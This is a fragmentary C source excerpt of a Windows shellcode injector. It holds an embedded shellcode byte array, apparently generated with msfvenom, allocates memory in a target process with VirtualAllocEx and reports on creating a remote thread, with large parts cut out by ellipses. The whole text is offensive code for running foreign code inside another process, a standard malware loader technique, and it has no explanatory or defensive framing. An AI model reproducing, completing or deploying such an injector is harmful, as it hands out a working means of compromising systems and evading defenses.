...
int main(int argc, char** argv){
	...
	"\x52\xe8\x5f\xff\xff\xff\x68\x64\x65\x58\x20\x68\x6c\x20"
	"\x43\x6f\x68\x53\x68\x65\x6c\x31\xdb\x88\x5c\x24\x0a\x89"
	"\xe3\x68\x6d\x58\x20\x20\x68\x56\x65\x6e\x6f\x68\x20\x4d"
	"\x53\x46\x68\x65\x20\x62\x79\x68\x6c\x43\x6f\x64\x68\x53"
	...
	LPVOID allocated_mem = VirtualAllocEx(hProcess,
					NULL,
                                        sizeof(shellcode),
	...
	if (allocated_mem == NULL) {
		printf("[-] Failed to allocated memory :%d\n", GetLastError());
		return 1;
	}
	...
	if (hThread == NULL) {
		printf("[-] Failed to create thread:%ul\n", GetLastError());
		return 1;
	}
